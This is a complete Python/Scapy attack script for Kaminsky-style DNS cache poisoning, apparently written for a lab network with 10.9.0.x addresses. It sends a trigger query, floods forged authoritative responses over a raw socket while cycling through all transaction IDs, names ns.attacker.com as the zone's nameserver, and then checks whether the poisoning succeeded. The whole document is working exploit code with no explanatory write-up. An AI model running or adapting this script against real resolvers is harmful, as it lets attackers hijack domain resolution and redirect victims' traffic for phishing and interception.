from scapy.all import *
import struct
import socket
import random
import string

target_dns = "10.9.0.53"
auth_dns = "10.9.0.154"
target_port = 33333

# 1. Generating a random subdomain to trigger the vulnerability
random_prefix = ''.join([random.choice(string.ascii_lowercase) for _ in range(5)])
domain = "{}.example.com".format(random_prefix)

print("[*] 1. Sending trigger query for {}...".format(domain))
trigger = IP(dst=target_dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
send(trigger, verbose=0)

print("[*] 2. Flooding spoofed KAMINSKY responses (Layer 2)...")
# PAYLOAD KAMINSKY:
# - ns: Inserting our fake server as Authority for the entire zone
# - ar: Providing the IP of our fake server (The IP of the attacking machine)
base_pkt = (
    Ether(dst="ff:ff:ff:ff:ff:ff") /
    IP(src=auth_dns, dst=target_dns) /
    UDP(sport=53, dport=target_port, chksum=0) /
    DNS(id=0, qr=1, aa=1, 
        qd=DNSQR(qname=domain), 
        an=DNSRR(rrname=domain, type='A', ttl=86400, rdata="1.1.1.1"),
        ns=DNSRR(rrname="example.com", type='NS', ttl=86400, rdata="ns.attacker.com"),
        ar=DNSRR(rrname="ns.attacker.com", type='A', ttl=86400, rdata="10.9.0.10"))
)

raw_bytes = bytearray(raw(base_pkt))
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.bind(("eth0", 0))

# Transaction ID (id) offset is always 42 
# (14 Ethernet + 20 IP + 8 UDP = 42)
for txid in range(0, 65535):
    struct.pack_into('!H', raw_bytes, 42, txid)
    s.send(raw_bytes)

print("[+] Kaminsky flood complete for {}!".format(domain))

print("[*] 3. Verifying cache poisoning...")
verification = sr1(IP(dst=target_dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain)), timeout=3, verbose=0)
if verification and verification.haslayer(DNS) and verification.an and verification.an.rdata == "1.1.1.1":
    print("[+] Verification SUCCESS: {} resolves to 1.1.1.1".format(domain))
else:
    print("[-] Verification FAILED: {} did not resolve to the fake IP".format(domain))
